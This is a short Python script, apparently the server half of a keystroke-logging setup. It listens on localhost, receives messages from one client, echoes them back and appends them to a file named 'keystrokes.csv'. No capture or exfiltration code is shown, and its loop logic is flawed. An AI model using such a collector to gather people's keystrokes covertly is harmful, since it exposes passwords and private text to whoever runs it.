import socket
import csv
import ast
from contextlib import closing

with closing(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((('localhost', 9999)))
    s.listen(3)
    client, addr = s.accept()


while True:
    print('Connected: ', addr)
    while True:
        data = client.recv(1024)
        if not data:
            break
        udata = data.decode()
        client.send(udata.encode('utf-8'))
        # save to file
        udata = ast.literal_eval(udata)
        with open('keystrokes.csv', 'a', newline='') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow(udata)
